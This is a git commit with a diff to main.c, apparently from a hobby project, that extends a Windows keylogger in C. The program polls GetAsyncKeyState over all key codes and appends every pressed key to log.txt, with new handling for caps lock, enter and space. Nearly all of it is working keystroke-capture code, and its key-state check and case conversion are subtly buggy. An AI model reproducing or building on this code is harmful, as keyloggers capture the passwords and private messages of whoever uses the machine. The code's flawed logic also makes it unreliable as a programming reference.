dd0684ec800bfb87e55652d8769240025b412977
ivanmustdie <h3005972@mvrht.com>
2016-10-28 23:21:34 +0200

    Partially solved character recognition
    Now it recognices caps lock and carriage return. Numbers and other
    non-alphanumericals characters works meh.

--- main.c
+++ main.c
@@ -11,17 +11,36 @@ int main()
 
     fp = fopen("log.txt","a");
     fprintf(fp,"testing");
-
+    int state = GetKeyState(VK_CAPITAL);
+    printf("%i", state);
     while(running){
         Sleep(10);
+        int state = GetKeyState(VK_CAPITAL);
         for(int ch= 8;ch<=222;ch++){
 
             if((GetAsyncKeyState(ch)& 0x8000!=0)){
-                printf("You pressed %i \n",ch);
+                printf("You pressed %c ",ch);
+                printf("ASCII: %i \n",ch);
                 //fprintf(fp,ch);
-                fputc(ch,fp);
-                if(ch == 27){
+
+
+                switch (ch){
+                case 13:
+                    fputs("\n",fp);
+                    break;
+                case 32:
+                    fputc(32,fp);
+                    break;
+                case 27:
                     running = 0;
+                    break;
+
+                default :
+                    if(state)
+                        fputc(ch,fp);
+                    else
+                        fputc(ch+32,fp);
+                    break;
                 }
             }
         }
